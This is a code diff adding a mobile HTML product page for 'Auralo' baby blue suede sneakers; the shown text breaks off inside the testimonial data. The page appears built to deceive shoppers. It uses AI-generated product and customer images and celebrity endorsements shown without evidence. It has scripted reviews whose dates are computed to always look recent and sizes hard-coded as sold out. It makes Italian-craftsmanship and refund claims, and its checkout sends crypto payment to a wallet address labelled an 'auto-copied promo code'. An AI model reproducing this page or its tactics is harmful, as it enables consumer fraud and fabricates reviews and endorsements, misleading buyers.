@@ -1,0 +1,627 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><meta name="apple-mobile-web-app-capable" content="yes"><title>Auralo Baby Blue Suede Sneakers - Limited Edition</title><script>
+    const IMG_CONFIG = {
+        productFolder: './images/product/',
+        testimonialsFolder: './images/testimonials/',
+        favoritesFolder: './images/worn-by-favorites/',
+        videoPath: './checkout-video-mobile/mobile-popup-checkout-video.mp4'
+    };
+    // Professional Image Loader - Like Page Builders
+    class SmartImageLoader {
+        constructor() {
+            this.manifest = null;
+            this.loadedImages = {};
+        }
+        async loadManifest() {
+            try {
+                // Single HTTP request for manifest - like real platforms
+                const response = await fetch('./images/manifest.json');
+                if (response.ok) {
+                    this.manifest = await response.json();
+                    console.log('Manifest loaded:', this.manifest);
+                    return true;
+                }
+            } catch (e) {
+                console.log('No manifest, using fallback detection');
+            }
+            // Fallback with actual image names for direct file access
+            this.manifest = {
+                product: [
+                    'webp_Generated_Image_September_28,_2025_-_11_12AM.webp',
+                    'webp_Generated_Image_September_28,_2025_-_11_13AM_(1).webp',
+                    'webp_Generated_Image_September_28,_2025_-_11_13AM.webp',
+                    'webp_Generated_Image_September_28,_2025_-_11_14AM.webp'
+                ],
+                testimonials: [
+                    'webp_Generated Image September 28, 2025 - 11_16AM (1).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (2).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (3).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (4).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (5).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (6).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (7).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (8).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (9).webp',
+                    'webp_Generated Image September 28, 2025 - 11_16AM (10).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (1).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (2).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (3).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (4).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (5).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (6).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (7).webp',
+                    'webp_Generated Image September 28, 2025 - 11_19AM (8).webp'
+                ],
+                'worn-by-favorites': [
+                    'alix-earle.jpg',
+                    'monet-mcmichael.jpg',
+                    'alex-cooper.jpeg'
+                ]
+            };
+            return false;
+        }
+        getImagesForFolder(folderKey) {
+            if (!this.manifest) return [];
+            return this.manifest[folderKey] || [];
+        }
+        async loadProductGallery() {
+            const images = this.getImagesForFolder('product');
+            const mainImage = document.querySelector('.main-image');
+            const thumbnailStrip = document.querySelector('.thumbnail-strip');
+            if (mainImage && images.length > 0) {
+                const src = IMG_CONFIG.productFolder + images[0];
+                mainImage.src = src;
+                mainImage.dataset.src = src;
+            }
+            if (thumbnailStrip) {
+                thumbnailStrip.innerHTML = '';
+                images.slice(0, 5).forEach((filename, index) => {
+                    const src = IMG_CONFIG.productFolder + filename;
+                    const thumb = document.createElement('img');
+                    thumb.className = index === 0 ? 'thumbnail active' : 'thumbnail';
+                    thumb.src = src;
+                    thumb.dataset.src = src;
+                    thumb.alt = `Product ${index + 1}`;
+                    thumb.addEventListener('click', () => {
+                        if (mainImage) mainImage.src = src;
+                        document.querySelectorAll('.thumbnail').forEach(t => t.classList.remove('active'));
+                        thumb.classList.add('active');
+                    });
+                    thumbnailStrip.appendChild(thumb);
+                });
+            }
+        }
+        loadTestimonialImages() {
+            const images = this.getImagesForFolder('testimonials');
+            this.loadedImages.testimonials = images.map(filename =>
+                IMG_CONFIG.testimonialsFolder + filename
+            );
+        }
+        loadFavoriteImages() {
+            const images = this.getImagesForFolder('worn-by-favorites');
+            const container = document.querySelector('.favorites-scroll');
+            if (container) {
+                const items = container.querySelectorAll('.favorite-item img');
+                items.forEach((img, index) => {
+                    if (images[index]) {
+                        const src = IMG_CONFIG.favoritesFolder + images[index];
+                        img.dataset.src = src;
+                        img.src = src;
+                    }
+                });
+            }
+        }
+        async initialize() {
+            // Load manifest first (1 HTTP request)
+            await this.loadManifest();
+            // Then load all images using manifest data (0 failed requests)
+            this.loadProductGallery();
+            this.loadTestimonialImages();
+            this.loadFavoriteImages();
+        }
+    }
+    // Initialize smart loader when DOM is ready
+    const smartLoader = new SmartImageLoader();
+    window.SmartImageLoader = smartLoader; // Expose for testing
+    </script><style>*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;line-height:1.5;color:#000;background:#fff;-webkit-font-smoothing:antialiased}.hero-banner{background:#000;color:#fff;padding:12px;text-align:center;font-size:0.85rem;font-weight:500;letter-spacing:0.5px}.product-gallery{position:relative;width:100%;overflow:hidden}.main-image{width:100%;height:auto;aspect-ratio:1;object-fit:cover;display:block}.thumbnail-strip{display:flex;gap:8px;padding:10px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}.thumbnail-strip::-webkit-scrollbar{display:none}.thumbnail{width:60px;height:60px;object-fit:cover;border-radius:4px;flex-shrink:0;border:2px solid transparent;cursor:pointer}.thumbnail.active{border-color:#000}.product-info{padding:20px 15px}.product-title{font-size:1.5rem;font-weight:700;margin-bottom:5px;line-height:1.2}.product-subtitle{color:#666;font-size:0.9rem;margin-bottom:15px}.price-area{display:flex;align-items:baseline;gap:10px;margin-bottom:15px}.current-price{font-size:1.75rem;font-weight:700}.original-price{font-size:1.1rem;text-decoration:line-through;color:#999}.sale-badge{background:#ff0000;color:white;padding:2px 8px;border-radius:4px;font-size:0.75rem;font-weight:600}.trust-badges{display:flex;flex-wrap:wrap;gap:10px;margin:15px 0;font-size:0.85rem}.trust-badge{display:flex;align-items:center;gap:5px}.size-selector{margin:20px 0}.size-label{font-weight:600;margin-bottom:10px;display:block}.size-options{display:flex;gap:8px;flex-wrap:wrap}.size-btn{min-width:50px;padding:10px 15px;border:2px solid #ddd;background:white;border-radius:4px;font-weight:500;cursor:pointer;transition:all 0.2s}.size-btn:active,.size-btn.selected{background:#000;color:white;border-color:#000}.add-to-cart{background:linear-gradient(135deg,#C5DDE8 0%,#B8D4E3 50%,#A5C7D8 100%);color:#2C3E50;width:100%;padding:16px;border:none;border-radius:8px;font-size:1rem;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;cursor:pointer;transition:all 0.2s;margin-bottom:10px;box-shadow:0 2px 8px rgba(184,212,227,0.4),inset 0 1px 0 rgba(255,255,255,0.3);position:relative;overflow:hidden;text-shadow:0 1px 1px rgba(255,255,255,0.3)}.add-to-cart::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background-image:repeating-linear-gradient( 45deg,transparent,transparent 2px,rgba(255,255,255,0.05) 2px,rgba(255,255,255,0.05) 3px ),repeating-linear-gradient( -45deg,transparent,transparent 2px,rgba(0,0,0,0.02) 2px,rgba(0,0,0,0.02) 3px );pointer-events:none}.add-to-cart:hover{transform:translateY(-1px);box-shadow:0 4px 12px rgba(184,212,227,0.6),inset 0 1px 0 rgba(255,255,255,0.4);background:linear-gradient(135deg,#D0E3EC 0%,#C3DEEA 50%,#B0D2E3 100%)}.add-to-cart:active{transform:scale(0.98);box-shadow:0 1px 4px rgba(184,212,227,0.4),inset 0 1px 2px rgba(0,0,0,0.1)}.pre-order-btn{background:white;color:#000;width:100%;padding:16px;border:2px solid #000;border-radius:8px;font-size:1rem;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;cursor:pointer;transition:all 0.2s}.pre-order-btn:active{transform:scale(0.98);background:#f5f5f5}.featured-fabric{padding:40px 15px;background:white;border-top:1px solid #f0f0f0}.fabric-features{display:flex;justify-content:space-around;gap:20px;margin-top:20px}.fabric-feature{text-align:center;flex:1}.feature-icon{width:80px;height:80px;margin:0 auto 10px;background:linear-gradient(145deg,#ffffff,#f8f8f8);box-shadow:0 8px 16px rgba(0,0,0,0.08),inset 0 1px 0 rgba(255,255,255,0.9);border-radius:50%;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}.feature-icon::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 30% 30%,rgba(255,255,255,0.8),transparent 60%);pointer-events:none}.feature-icon svg{width:36px;height:36px;stroke-width:1.5;z-index:1}.feature-label{font-size:0.9rem;font-weight:600;color:#000;letter-spacing:-0.02em}.product-details-section{padding:20px 15px;background:white}.detail-dropdown{border-bottom:1px solid #e5e5e5;margin-bottom:10px}.detail-header{display:flex;justify-content:space-between;align-items:center;padding:15px 0;cursor:pointer}.detail-title{display:flex;align-items:center;gap:10px;font-weight:600;font-size:1rem}.detail-title svg{flex-shrink:0}.detail-arrow{transition:transform 0.3s;font-size:0.8rem;color:#666}.detail-arrow.open{transform:rotate(180deg)}.detail-content{max-height:0;overflow:hidden;transition:max-height 0.3s ease;padding:0}.detail-content.open{max-height:500px;padding:0 0 15px 0}.detail-text{font-size:0.9rem;line-height:1.6;color:#333}.guarantee-badge{background:linear-gradient(135deg,#10b981 0%,#059669 100%);color:white;padding:12px 20px;border-radius:50px;display:inline-flex;align-items:center;gap:10px;font-weight:600;font-size:0.9rem;margin:15px 0;box-shadow:0 4px 10px rgba(16,185,129,0.3)}.guarantee-icon{font-size:20px}.worn-by-favorites{padding:30px 0;background:#f8f8f8}.section-header{text-align:center;font-size:1.25rem;font-weight:700;text-transform:uppercase;letter-spacing:1px;margin-bottom:20px}.favorites-scroll{display:flex;gap:15px;overflow-x:auto;padding:0 15px;-webkit-overflow-scrolling:touch;scrollbar-width:none}.favorites-scroll::-webkit-scrollbar{display:none}.favorite-item{flex-shrink:0;text-align:center}.favorite-avatar{width:100px;height:100px;border-radius:50%;object-fit:cover;margin-bottom:8px}.favorite-name{font-weight:600;font-size:0.85rem}.favorite-handle{color:#666;font-size:0.75rem}.testimonials-section{padding:30px 10px;background:white}.testimonial-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}.testimonial-item{background:white;border-radius:12px}.testimonial-image{width:100%;aspect-ratio:3 / 4;object-fit:contain;background:#f8f8f8;border-radius:12px 12px 0 0}.testimonial-content-wrapper{padding:12px}.testimonial-name{font-weight:700;font-size:0.95rem;color:#000;margin-bottom:4px}.verified-badge{display:flex;align-items:center;gap:4px;color:#000;font-size:0.75rem;margin-bottom:8px}.verified-check{width:16px;height:16px;background:#00b67a;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;color:white;font-size:10px;font-weight:bold}.testimonial-date{color:#666;font-size:0.7rem}.testimonial-stars{margin-bottom:8px;font-size:0.9rem;color:#000}.testimonial-title{font-weight:700;font-size:0.95rem;color:#000;margin-bottom:6px;line-height:1.2}.testimonial-text{font-size:0.85rem;line-height:1.4;color:#333;font-weight:400}.reviews-section{padding:30px 0;background:#f8f8f8;overflow:hidden}.reviews-carousel-container{position:relative;padding:0 15px}.reviews-carousel{display:flex;gap:15px;overflow-x:auto;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch;scrollbar-width:none;padding-bottom:15px}.reviews-carousel::-webkit-scrollbar{display:none}.review-item{flex:0 0 85%;scroll-snap-align:start;background:white;padding:20px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.08);position:relative}.review-platform{position:absolute;top:15px;right:15px;width:24px;height:24px}.review-header{margin-bottom:12px}.review-author{font-weight:700;font-size:0.95rem;margin-bottom:4px}.review-verified{display:inline-flex;align-items:center;gap:4px;color:#00b67a;font-size:0.75rem;margin-bottom:8px}.review-rating{font-size:0.9rem;margin-bottom:10px}.review-content{font-size:0.9rem;line-height:1.5;color:#333;margin-bottom:12px}.review-footer{display:flex;justify-content:space-between;align-items:center;font-size:0.75rem;color:#666;padding-top:12px;border-top:1px solid #f0f0f0}.carousel-dots{display:flex;justify-content:center;gap:6px;margin-top:15px}.carousel-dot{width:8px;height:8px;border-radius:50%;background:#d0d0d0;transition:all 0.3s;cursor:pointer}.carousel-dot.active{background:#000;width:24px;border-radius:4px}.checkout-modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);z-index:10000;align-items:flex-end}.checkout-modal.active{display:flex}.modal-content{background:white;width:100%;border-radius:20px 20px 0 0;max-height:85vh;overflow-y:auto;padding:20px;animation:slideUp 0.3s ease}@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}.modal-title{font-size:1.2rem;font-weight:700}.modal-close{background:none;border:none;font-size:1.5rem;color:#999;cursor:pointer}.skeleton{background:linear-gradient(90deg,#f0f0f0 25%,#e0e0e0 50%,#f0f0f0 75%);background-size:200% 100%;animation:shimmer 1.5s infinite}@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}img[data-src]{opacity:0;transition:opacity 0.3s}img.loaded{opacity:1}.sold-out-notification{position:fixed;top:20px;right:20px;width:280px;max-width:calc(100vw - 40px);background:white;border-left:4px solid #ef4444;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.15);padding:16px 20px;z-index:10000;transform:translateX(400px);transition:transform 0.3s ease-out}.sold-out-notification.slide-in{transform:translateX(0)}.sold-out-notification.slide-out{transform:translateX(400px)}.notification-close{position:absolute;top:8px;right:8px;background:none;border:none;font-size:24px;color:#999;cursor:pointer;padding:0}.notification-content{display:flex;align-items:flex-start;gap:12px}.notification-icon{font-size:30px;line-height:1}.notification-text h4{margin:0 0 6px 0;font-size:16px;font-weight:600;color:#333}.size-btn.sold-out{background:#f5f5f5;color:#999;text-decoration:line-through;cursor:not-allowed;opacity:0.6;position:relative}.size-stock{display:block;font-size:0.6rem;color:#ef4444;margin-top:2px}.sticky-footer{position:fixed;bottom:0;left:0;right:0;background:white;padding:10px 15px;box-shadow:0 -2px 10px rgba(0,0,0,0.1);z-index:1000}.sticky-button{padding:12px;border-radius:6px;cursor:pointer;transition:all 0.2s}</style></head><body><div class="hero-banner">
+        🔥 EXCLUSIVE LAUNCH - BABY BLUE SUEDE • FREE WORLDWIDE SHIPPING
+    </div><div class="product-gallery"><img class="main-image skeleton"
+             id="mainImage"
+             src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
+             data-src="./images/product/1.jpg"
+             alt="Product Image"><div class="thumbnail-strip"></div></div><div class="product-info"><h1 class="product-title">Auralo Baby Blue Suede Sneakers</h1><p class="product-subtitle">Handcrafted Italian Luxury - Limited Release</p><div class="price-area"><span class="current-price" id="displayPrice">$69</span><span class="original-price">$120</span><span class="sale-badge">42% OFF</span></div><div class="trust-badges"><span class="trust-badge">✓ Handcrafted in Italy</span><span class="trust-badge">⚡ Ships Within 24 Hours</span><span class="trust-badge">⭐ Premium Suede Material</span></div><div style="background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; padding: 10px; border-radius: 8px; margin: 15px 0; text-align: center;"><div style="font-weight: 700; font-size: 0.95rem; margin-bottom: 3px;">
+                🛡️ 100% Authentic Guarantee + Free Returns
+            </div><div style="font-size: 0.8rem; opacity: 0.95;">
+                Not satisfied? Return within 30 days for a full refund. No questions asked!
+            </div></div><div class="size-selector"><label class="size-label">Select Size:</label><div class="size-options"><button class="size-btn sold-out" data-size="33" onclick="selectSize(this)">33<span class="size-stock">SOLD OUT</span></button><button class="size-btn sold-out" data-size="34" onclick="selectSize(this)">34<span class="size-stock">SOLD OUT</span></button><button class="size-btn sold-out" data-size="35" onclick="selectSize(this)">35<span class="size-stock">SOLD OUT</span></button><button class="size-btn" data-size="36" onclick="selectSize(this)">36</button><button class="size-btn" data-size="37" onclick="selectSize(this)">37</button><button class="size-btn" data-size="38" onclick="selectSize(this)">38</button><button class="size-btn" data-size="39" onclick="selectSize(this)">39</button><button class="size-btn" data-size="40" onclick="selectSize(this)">40</button><button class="size-btn" data-size="41" onclick="selectSize(this)">41</button><button class="size-btn sold-out" data-size="42" onclick="selectSize(this)">42<span class="size-stock">SOLD OUT</span></button><button class="size-btn sold-out" data-size="43" onclick="selectSize(this)">43<span class="size-stock">SOLD OUT</span></button><button class="size-btn" data-size="44" id="size44" onclick="selectSize(this)">44</button></div></div><button class="add-to-cart" onclick="handleAddToCart('today')" style="background: linear-gradient(135deg, #C5DDE8 0%, #B8D4E3 50%, #A5C7D8 100%); color: #2C3E50; margin-bottom: 10px; padding: 18px; border: none; font-weight: 700; border-radius: 8px; box-shadow: 0 2px 8px rgba(184, 212, 227, 0.4), inset 0 1px 0 rgba(255,255,255,0.3); position: relative; overflow: hidden; text-shadow: 0 1px 1px rgba(255,255,255,0.3);"><div style="font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">ADD TO CART - $69</div><div style="font-size: 0.8rem; opacity: 0.8; margin-top: 3px; font-weight: 400;">In-Stock: Ready to Ship</div></button><button class="pre-order-btn" onclick="handleAddToCart('preorder')" id="preorderBtn" style="background: white; color: #000; border: 2px solid #000; padding: 18px; border-radius: 8px;"><div style="font-weight: 700; font-size: 1rem; text-transform: uppercase; letter-spacing: 0.5px;">ADD PRE-ORDER TO CART - $29</div><div id="shipDate" style="font-size: 0.8rem; opacity: 0.8; margin-top: 3px; font-weight: 400;">Wait & Save: Estimated to Ship Dec 14</div></button></div><section class="featured-fabric"><h2 class="section-header">Featured Fabric</h2><div class="fabric-features"><div class="fabric-feature"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-linecap="round" stroke-linejoin="round"><path d="M20.24 12.24a6 6 0 0 0-8.49-8.49L5 10.5V19h8.5z"/><line x1="16" y1="8" x2="2" y2="22"/><line x1="17.5" y1="15" x2="9" y2="15"/><circle cx="16" cy="8" r="0.5" fill="#000"/></svg></div><div class="feature-label">Soothingly Soft</div></div><div class="fabric-feature"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-linecap="round" stroke-linejoin="round"><path d="M21 9.5H14.5M14.5 9.5L17 7M14.5 9.5L17 12"/><path d="M3 9.5H9.5M9.5 9.5L7 7M9.5 9.5L7 12"/><path d="M12 3V21"/><path d="M8 3H16"/><path d="M8 21H16"/></svg></div><div class="feature-label">Pre-Shrunk</div></div><div class="fabric-feature"><div class="feature-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#000" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 5-7 5 7 7 7 5-7 7-7 5 7 5 7" opacity="0.3"/><path d="M2 17s3-5 5-5 5 5 7 5 5-5 7-5 3 5 3 5"/><circle cx="8" cy="12" r="1.5" fill="#000" opacity="0.5"/><circle cx="16" cy="12" r="1.5" fill="#000" opacity="0.5"/></svg></div><div class="feature-label">Wrinkle Free</div></div></div></section><section class="product-details-section"><div class="detail-dropdown"><div class="detail-header" onclick="toggleDetail(this)"><div class="detail-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10" fill="none" stroke="#000" stroke-width="1.5"/><path d="M12 16v-4" stroke="#000" stroke-width="2"/><circle cx="12" cy="8" r="1" fill="#000"/></svg><span>Description</span></div><span class="detail-arrow">▼</span></div><div class="detail-content"><div class="detail-text">
+                    Introducing the Auralo Baby Blue Suede Sneakers - where Italian craftsmanship meets contemporary street style.
+                    These aren't just sneakers; they're a statement piece that elevates any outfit. Handcrafted in Italy's
+                    finest ateliers using premium baby blue suede sourced from Tuscany, each pair undergoes 47 individual
+                    quality checks. The distinctive color - a soft powder blue reminiscent of clear Mediterranean skies -
+                    pairs effortlessly with everything from tailored pants to casual denim. Features include a cushioned
+                    OrthoLite® insole for all-day comfort, durable Margom sole, and signature gold-foil stamped serial number.
+                </div></div></div><div class="detail-dropdown"><div class="detail-header" onclick="toggleDetail(this)"><div class="detail-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s2-5 4-5c2 0 3 2 5 2s3-2 5-2c2 0 3 2 5 2s3-2 4-2" stroke="#000" stroke-width="1.5"/><path d="M2 17s2-3 4-3c2 0 3 1.5 5 1.5s3-1.5 5-1.5c2 0 3 1.5 5 1.5s1-1.5 1-1.5" stroke="#000" stroke-width="1.5" opacity="0.6"/><circle cx="8" cy="12" r="1" fill="#000" opacity="0.3"/><circle cx="16" cy="12" r="1" fill="#000" opacity="0.3"/></svg><span>Materials</span></div><span class="detail-arrow">▼</span></div><div class="detail-content"><div class="detail-text">
+                    • Upper: 100% Premium Italian Suede (Baby Blue)<br>
+                    • Lining: Soft Calfskin Leather<br>
+                    • Sole: Margom Rubber (Made in Italy)<br>
+                    • Insole: OrthoLite® Cushioned Technology<br>
+                    • Construction: Blake Stitch<br>
+                    • Hardware: Brushed Gold Eyelets<br>
+                    • Laces: Waxed Cotton (Extra Pair Included)<br>
+                    • Handcrafted in Milan, Italy
+                </div></div></div><div class="detail-dropdown"><div class="detail-header" onclick="toggleDetail(this)"><div class="detail-title"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="6" width="20" height="4" rx="1" fill="none" stroke="#000" stroke-width="1.5"/><line x1="7" y1="6" x2="7" y2="10" stroke="#000" stroke-width="1"/><line x1="12" y1="6" x2="12" y2="10" stroke="#000" stroke-width="1"/><line x1="17" y1="6" x2="17" y2="10" stroke="#000" stroke-width="1"/><path d="M8 14l-1.5 1.5M8 14l1.5 1.5M16 14l-1.5 1.5M16 14l1.5 1.5" stroke="#000" stroke-width="1" opacity="0.6"/><line x1="8" y1="14" x2="16" y2="14" stroke="#000" stroke-width="1.5" stroke-dasharray="2 2"/></svg><span>Size & Fit</span></div><span class="detail-arrow">▼</span></div><div class="detail-content"><div class="detail-text"><strong>Fit:</strong> True to EU Size, Regular Width<br><br><strong>EU to US Size Conversion:</strong><br>
+                    • EU 36 = US Women's 6 / Men's 4<br>
+                    • EU 37 = US Women's 7 / Men's 5<br>
+                    • EU 38 = US Women's 8 / Men's 6<br>
+                    • EU 39 = US Women's 9 / Men's 7<br>
+                    • EU 40 = US Women's 10 / Men's 8<br>
+                    • EU 41 = US Women's 11 / Men's 9<br>
+                    • EU 44 = US Women's 13 / Men's 11<br><br><em>Model wears EU 39 (US 7 Men's)</em><br><br>
+                    💙 <strong>Perfect Fit Guarantee:</strong> Free returns within 30 days if not completely satisfied.
+                </div></div></div></section><section class="worn-by-favorites"><h2 class="section-header">Worn By Your Favorites</h2><div class="favorites-scroll"><div class="favorite-item"><img class="favorite-avatar skeleton"
+                     src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
+                     data-src="./images/worn-by-favorites/alix-earle.jpg"
+                     loading="lazy"
+                     alt="Alix Earle"><div class="favorite-name">Alix Earle</div><div class="favorite-handle">@alixearle</div></div><div class="favorite-item"><img class="favorite-avatar skeleton"
+                     src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
+                     data-src="./images/worn-by-favorites/monet-mcmichael.jpg"
+                     loading="lazy"
+                     alt="Monet McMichael"><div class="favorite-name">Monet McMichael</div><div class="favorite-handle">@monetmcmichael</div></div><div class="favorite-item"><img class="favorite-avatar skeleton"
+                     src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
+                     data-src="./images/worn-by-favorites/alex-cooper.jpeg"
+                     loading="lazy"
+                     alt="Alex Cooper"><div class="favorite-name">Alex Cooper</div><div class="favorite-handle">@alexandracooper</div></div></div></section><section class="reviews-section"><h2 class="section-header">Reviews</h2><div class="reviews-carousel-container"><div class="reviews-carousel" id="reviewsCarousel"></div><div class="carousel-dots" id="reviewDots"></div></div></section><section class="testimonials-section"><h2 class="section-header">Testimonials</h2><div class="testimonial-grid" id="testimonialGrid"></div></section><div class="sticky-footer"><button class="sticky-button" onclick="handleAddToCart('preorder')" style="width: 100%; background: white; color: #000; border: 2px solid #000; font-weight: 600; text-transform: uppercase; font-size: 0.9rem; padding: 14px; border-radius: 5px;">
+            PRE-ORDER - $29
+        </button></div><div class="checkout-modal" id="checkoutModal"><div class="modal-content"><div class="modal-header"><h2 class="modal-title">Complete Order with SimpleSwap</h2><button class="modal-close" onclick="closeCheckout()">×</button></div><div style="background: #000; border-radius: 8px; margin-bottom: 20px; overflow: hidden; position: relative; min-height: 200px;"><div id="videoPlaceholder" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #1a1a1a, #2d2d2d); z-index: 1;"><div style="text-align: center; color: white;"><svg width="60" height="60" viewBox="0 0 24 24" fill="none" style="margin-bottom: 10px;"><circle cx="12" cy="12" r="10" stroke="white" stroke-width="1.5" opacity="0.5"/><path d="M10 8L16 12L10 16V8Z" fill="white" stroke="white" stroke-width="1.5" stroke-linejoin="round"/></svg><p style="margin: 0; font-size: 0.9rem; opacity: 0.9;">Tap to load checkout tutorial</p></div></div><video id="checkoutVideo"
+                       controls
+                       playsinline
+                       preload="none"
+                       style="width: 100%; height: auto; display: block; position: relative; z-index: 2;"
+                       data-src="./checkout-video-mobile/mobile-popup-checkout-video.mp4"><source data-src="./checkout-video-mobile/mobile-popup-checkout-video.mp4" type="video/mp4"></video></div><div style="padding: 15px; background: #f8f8f8; border-radius: 8px; margin-bottom: 20px;"><h3 style="margin-bottom: 10px;">Order Summary</h3><div style="display: flex; justify-content: space-between; margin-bottom: 8px;"><span>Auralo Baby Blue Suede Sneakers - Size <span id="modalSelectedSize">-</span></span><span id="checkoutPrice">$69</span></div><div id="bumpSummary"></div><div style="border-top: 1px solid #ddd; margin-top: 10px; padding-top: 10px; display: flex; justify-content: space-between; font-weight: 700;"><span>Total</span><span id="totalPrice">$69</span></div></div><div class="order-bump-section" style="background: linear-gradient(135deg, #fff5f5 0%, #ffe8e8 100%); border-radius: 12px; padding: 20px; margin: 20px 0; border: 2px dashed #ff4444;"><div style="display: flex; align-items: flex-start; gap: 15px;"><input type="checkbox" id="orderBumpCheckbox" onchange="updateTotal()" checked style="width: 24px; height: 24px; cursor: pointer; margin-top: 2px;"><div style="flex: 1;"><h4 style="margin: 0 0 8px 0; color: #333; font-size: 16px; font-weight: 600;">🎁 Add Luxury Shoe Care Kit - 88% OFF</h4><p style="margin: 0 0 12px 0; color: #666; font-size: 13px; line-height: 1.5;">Protect your investment with our premium Italian leather care kit. Includes suede protector spray, soft brush, and restoration cloth.</p><div style="display: flex; align-items: center; gap: 15px;"><img src="./images/order-bump/orderbumpimage.png" alt="Shoe Care Kit" style="width: 180px; height: 180px; object-fit: cover; border-radius: 8px; border: 1px solid #ddd;"><div><p style="margin: 0; font-size: 15px;"><span style="text-decoration: line-through; color: #999;">$80</span><span style="color: #ff4444; font-weight: 600; font-size: 18px;">$10</span></p><p style="margin: 5px 0 0 0; color: #ff4444; font-size: 11px; font-weight: 500;">⚡ One-Time Offer - Save $70!</p></div></div></div></div></div><div style="background: #e8f5e9; border: 2px solid #4caf50; padding: 12px; border-radius: 8px; margin-bottom: 20px; text-align: center;"><div style="font-size: 0.85rem; color: #2e7d32; margin-bottom: 5px;">Promo Code (Auto-Copied):</div><div id="walletAddress" style="font-family: monospace; font-size: 0.75rem; word-break: break-all; color: #1b5e20; font-weight: 600;">
+                    0xE5173e7c3089bD89cd1341b637b8e1951745ED5C
+                </div></div><button class="add-to-cart" onclick="completeCheckout()" style="background: #007BFF; color: white;">
+                CHECKOUT WITH SIMPLESWAP - <span id="finalTotal">$69</span></button><div style="text-align: center; margin-top: 15px; font-size: 0.8rem; color: #666;"><p>🔒 Secure crypto payment via SimpleSwap</p><p>✅ Order ships immediately after payment confirmation</p></div></div></div><script>
+        // Generate testimonial data with recent dates for all 18 images
+        const generateRecentDate = (daysAgo) => {
+            const date = new Date();
+            date.setDate(date.getDate() - daysAgo);
+            return date.toLocaleDateString('en-US', { month: '2-digit', day: '2-digit', year: 'numeric' });
+        };
+        const testimonialData = [
+            { name: "kensey s", date: generateRecentDate(2), title: "NEED THESE IN EVERY COLOR", text: "okkkk but these baby blue sneakers are EVERYTHING!! the italian craftsmanship is unmatched like i cant even... soo comfy too", avatar: 1 },
+            { name: "dani j", date: generateRecentDate(3), title: "better than my $800 shoes lol", text: "girlies these auralo sneakers lowkey beat my balenciagas fr... the baby blue suede is giving rich girl vibes 💸", avatar: 2 },
+            { name: "ash b", date: generateRecentDate(5), title: "my new personality trait", text: "the baby blue literally goes w everything in my closet!! love love loveee & the suede quality is insaneee", avatar: 3 },
+            { name: "eden m", date: generateRecentDate(7), title: "italian luxury periodttt", text: "these sneakers r pure luxury no cap! wore them all day walking around milan & my feet still felt amazingggg", avatar: 4 },
+            { name: "sarah m", date: generateRecentDate(8), title: "OBSESSED is an understatement", text: "the baby blue suede is STUNNING!! these sneakers make my whole fit look expensive asf 😭💯", avatar: 5 },
+            { name: "jules", date: generateRecentDate(10), title: "worth the hype frfr", text: "yall the quality is UNREAL... like my $500 designer sneakers could never. suede is literally butter soft!!", avatar: 6 },
+            { name: "emma w", date: generateRecentDate(12), title: "best purchase everrr", text: "these baby blue auralos r stunningggg! my girlies thought they were isabel marant but theyre actually better quality lmaoo", avatar: 7 },
